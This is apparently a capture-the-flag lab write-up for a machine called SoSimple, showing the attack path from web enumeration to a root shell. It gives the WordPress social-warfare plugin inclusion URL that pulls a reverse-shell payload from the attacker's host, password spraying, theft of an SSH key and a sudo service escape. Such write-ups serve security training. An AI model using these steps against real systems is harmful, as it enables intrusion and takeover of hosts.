SoSimple

Target IP: 192.168.186.78

Scanning



Looks like there are only two TCP ports open on the target machine: SSH and HTTP.

Enumeration

Port 80: HTTP

The webpage above is displayed for the application on this port.


Doing a source-code review of this page shows the message above. Time to perform directory search now.


Running gobuster scan shows the result from above. There are two interesting directories: /mybackup.txt and /wordpress.


Browsing to /mybackup.txt contains a long encoded base-32 string JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF. After decoding this string using Cyberchef, I obtained the message I have to keep this password somewhere safely because I can't remember it: opensesame. Now we have the password opensesame.


There is also another directory called /wordpress. Doing a source-code review shows the target host is running WordPress 5.4.2.


Running a wpscan against this WordPress application shows the target host has directory listing enabled; meaning, we can access sensitive contents. Maybe this will come in handy later?


When enumerating the users of the website, I found two users: max and admin. What if we can spray the password opensesame against the two usernames at /wp-admin login page?

Exploitation


Spraying the password opensesame with username max worked! I now have access to the WordPress application! The only problem is we are very limited with what we can do.


Running wpscan --url http://192.168.186.78/wordpress/ --plugins-detection aggressive showed the two vulnerable plugins used by the WordPress application, as shown above. These two plugins are:

  • simple-cart-solution 0.2.0
  • social-warfare 3.5.0



I found an article detailing how the exploit works. I followed the steps mentioned above and I was able to retrieve the /etc/passwd file.



Gaining a reverse shell is super easy too. I put my reverse shell script inside the payload.txt as shown above. Then I used the full URL http://192.168.186.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.222/payload.txt to obtain a reverse shell connection.

Privilege Escalation

There are two users: max.



The SSH key is available for the user max. I copied his SSH key to my local machine, changed permission, and logged in as max. And this turned out to be successful!


Since /usr/sbin/service can be run by steven with sudo privileges. I used sudo -u steven /usr/sbin/service ../../bin/sh to gain a shell as steven.


After gaining a shell, it shows /opt/tools/server-health.sh can be executed by root. However, the binary does not exist, so I had to create the directory and file.


Spawning a bash shell for the script. I then upgraded my shell to an interactive Python shell.


Then I gained a root shell by changing the permission of the binary to be executable, and running the binary as root.

Flags


The local.txt flag which is inside max home directory.


The proof.txt flag once I spawned a bash shell by creating and exploiting the /server-health.sh file.
